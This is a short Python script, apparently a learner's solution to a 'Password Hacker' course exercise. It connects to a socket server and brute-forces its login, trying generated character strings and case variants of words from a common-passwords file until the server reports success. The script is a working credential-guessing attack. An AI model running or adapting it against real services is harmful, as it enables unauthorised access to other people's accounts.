import string
import sys
import socket
import itertools
from typing import TextIO


def brute_force(char_base: list):
    for i in range(1, 6):
        for item in list(itertools.product(char_base, repeat=i)):
            password = ''.join(item)
            socket.send(password.encode())
            response = socket.recv(64).decode()
            if response == "Connection success!":
                return password


def dict_brute_force(common_passwords: TextIO):
    for common_password in common_passwords:
        passwords = list(map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] if letter in string.ascii_lowercase else letter for letter in common_password.strip()))))
        for password in passwords:
            socket.send(password.encode())
            response = socket.recv(64).decode()
            if response == "Connection success!":
                return password


ip, port = sys.argv[1], int(sys.argv[2])
chars = list(string.ascii_lowercase + string.digits)


with socket.socket() as socket:
    socket.connect((ip, port))
    # print(brute_force(chars))
    with open(r"C:\Users\Joao Marcos\PycharmProjects\Password Hacker\Password Hacker\task\passwords.txt", "r") as file:
        print(dict_brute_force(file))

